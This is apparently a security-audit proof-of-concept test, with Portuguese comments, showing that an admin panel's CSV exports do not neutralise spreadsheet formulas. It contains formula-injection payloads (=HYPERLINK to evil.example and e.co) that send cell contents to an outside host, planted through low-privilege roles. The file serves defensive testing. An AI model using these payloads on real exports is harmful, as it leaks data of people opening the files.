// PoC (r1-frontend-5): as exportações CSV do painel (src/lib/csv.ts, usada por todo DataTable "Exportar")
// não neutralizam fórmulas de planilha, enquanto o CSV da auditoria no servidor (csvCell) neutraliza.
// Os valores chegam ao CSV por caminhos que pessoas de cargo baixo controlam (e o servidor aceita):
//  - Suporte (usuarios.editar) grava etiquetas de jogador com "=HYPERLINK(...)" → coluna "Etiquetas" de usuarios.csv
//  - marketing (cupons.editar) grava código de cupom "=HYPERLINK(...)" → coluna "Código" de cupons.csv
//  - apelido do jogador (vem da plataforma/cadastro público) → coluna "Apelido" de usuarios.csv
// O teste afirma o comportamento seguro (célula não começa com = + - @) e FALHA enquanto o bug existir.
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { FastifyInstance } from 'fastify'
import { toCsv } from '@/lib/csv'
import { csvCell } from '../src/modules/audit/format'
import { api, createTestApp, loginAs } from './helpers'

const FORMULA_NICK = '=HYPERLINK("https://evil.example/c?d="&A2&B2,"Ver detalhes")'
const FORMULA_TAG = '=HYPERLINK("//e.co/?"&B2&C2,"ver")' // <= 40 caracteres (limite de etiqueta)
const FORMULA_CODE = '=HYPERLINK("https://evil.example/?"&A3,"X")'

let app: FastifyInstance

beforeAll(async () => {
  app = await createTestApp()
})
afterAll(async () => {
  await app.close()
})

function cellsOf(csv: string): string[][] {
  // CSV simples com ";" (sem ";" dentro dos valores deste teste)
  return csv.split('\r\n').map((l) => l.split(';'))
}

const dangerous = /^"?[=+\-@\t\r]/

describe('PoC r1-frontend-5: fórmula em CSV exportado pelo painel', () => {
  it('Suporte grava etiqueta-fórmula, marketing grava cupom-fórmula; o CSV do painel sai com a fórmula ativa', async () => {
    // base de jogadores (simula a plataforma): apelido escolhido pelo jogador no cadastro público
    const admin = await loginAs(app, 'superadmin')
    const seed = await api(app, 'PUT', '/api/kv/geral.jogadores', {
      cookie: admin.cookie,
      body: { value: [{ id: '1001', nickname: FORMULA_NICK, name: 'Jogador', email: 'j@x.com', tags: [], status: 'ativo', balanceReal: 0, balanceBonus: 0, coins: 0 }] },
    })
    expect(seed.statusCode).toBe(200)
    const v1 = seed.json().version

    // Suporte (cargo baixo, usuarios.editar) muda só as etiquetas → aceito pelo servidor
    const sup = await loginAs(app, 'suporte')
    const cur = await api(app, 'GET', '/api/kv/geral.jogadores', { cookie: sup.cookie })
    const list = cur.json().value as Record<string, unknown>[]
    list[0].tags = [FORMULA_TAG]
    const tagPut = await api(app, 'PUT', '/api/kv/geral.jogadores', { cookie: sup.cookie, body: { value: list, version: v1 } })
    console.log('suporte PUT etiquetas →', tagPut.statusCode)
    expect(tagPut.statusCode).toBe(200)

    // marketing (cargo personalizado, cupons.editar) grava cupom com código-fórmula → aceito
    const mkt = await loginAs(app, 'marketing')
    const cupPut = await api(app, 'PUT', '/api/kv/campanhas.cupons', {
      cookie: mkt.cookie,
      body: { value: { coupons: [{ id: 'c1', code: FORMULA_CODE, reward: 10 }] } },
    })
    console.log('marketing PUT cupom →', cupPut.statusCode)
    expect(cupPut.statusCode).toBe(200)

    // quem exporta (ex.: Financeiro/Admin) lê os dados como o painel lê
    const fin = await loginAs(app, 'administrador')
    const players = (await api(app, 'GET', '/api/kv/geral.jogadores', { cookie: fin.cookie })).json().value as {
      id: string
      nickname: string
      tags: string[]
    }[]
    const coupons = (await api(app, 'GET', '/api/kv/campanhas.cupons', { cookie: fin.cookie })).json().value.coupons as {
      code: string
    }[]

    // mesmas funções de coluna do painel: Usuarios.tsx (nickname csv: p.nickname; tags csv: p.tags.join(', '))
    // e Cupons.tsx (code: sortValue c.code → DataTable.doExport usa sortValue quando não há csv)
    const usuariosCsv = toCsv(players, [
      { header: 'ID', value: (p) => p.id },
      { header: 'Apelido', value: (p) => p.nickname },
      { header: 'Etiquetas', value: (p) => p.tags.join(', ') },
    ])
    const cuponsCsv = toCsv(coupons, [{ header: 'Código', value: (c) => c.code }])
    console.log('usuarios.csv (src/lib/csv.ts):\n' + usuariosCsv)
    console.log('cupons.csv (src/lib/csv.ts):\n' + cuponsCsv)
    console.log('mesmo apelido pelo csvCell do servidor (auditoria):', csvCell(FORMULA_NICK))

    // controle: o servidor neutraliza
    expect(csvCell(FORMULA_NICK)).toMatch(/^"?'=/)

    const [, playerRow] = cellsOf(usuariosCsv)
    const [, couponRow] = cellsOf(cuponsCsv)
    // comportamento seguro esperado: nenhuma célula começa com = + - @ (falha enquanto o bug existir)
    expect(playerRow[1]).not.toMatch(dangerous)
    expect(playerRow[2]).not.toMatch(dangerous)
    expect(couponRow[0]).not.toMatch(dangerous)
  })
})
